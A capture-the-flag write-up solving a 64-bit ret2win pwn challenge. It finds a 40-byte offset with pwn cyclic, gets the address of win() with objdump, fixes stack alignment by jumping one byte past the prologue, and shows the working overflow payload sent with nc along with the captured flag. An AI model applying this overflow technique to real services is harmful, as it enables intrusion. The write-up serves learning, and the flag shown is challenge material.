# Return to Santa

- Category: `pwn`
- Challenge author: **Björn Österman**

## Description

Santa wants a win()

### Connection info

```sh
nc 2021.santahack.xyz 42005
```

## Writeup

If you look at the program you will see that there is one function called 'win()'
The goal is to overwrite the stack and replacing the return-pointer with the address of the win()-function.

By starting 'gdb ./ret2santa' and the do a 
```console
run < <(pwn cyclic 100)
```
It will then segfault when trying to return. The value on the stack then starts with 'kaaa'

To find out how much data you need before putting in the address you can consult 'pwn cyclic' again:

```console
$ pwn cyclic -l kaaa
40
```

To find the address you can do the following:

```console
$ objdump -d ret2santa | grep "<win>"
00000000004017d0 <win>:
```

Now you can compose a payload:

:warning: If you use python3 and printf to print non-ascii-characters they will be converted into UTF-8

You can use Python 2 or just a shell echo:


:x: THIS DOESN'T WORK
```console
(pwn cyclic 40;echo -e "\xd0\x17\x40") | nc 2021.santahack.xyz 42005
```

The reason to why this doesn't work is because it's a 64-bit compiled binary and for this to work the stack has to be 16-aligned. Usually when a call is made it first pushes the return pointer to the stack and in the prolog of the function the EBP gets pushed to the stack. This is 8+8=16 bytes, so the alignment is maintained.

But when we "return" directly to the prolog, just pushing the EBP to the stack leaving it unaligned.

There are an easy ways to get around this:

**Just add 1 to the address so that the "push ebp"-instuction is skipped :-)**

In this case **0x4017d1**


```console
$ (pwn cyclic 40;echo -e "\xd1\x17\x40") | nc 2021.santahack.xyz 42005
Christmas is getting cold; we need a win NOW! Please help us!:

Let's try that!
You're awesome! Here's a flag for you :-)

haxmas{return_those_packets}
```
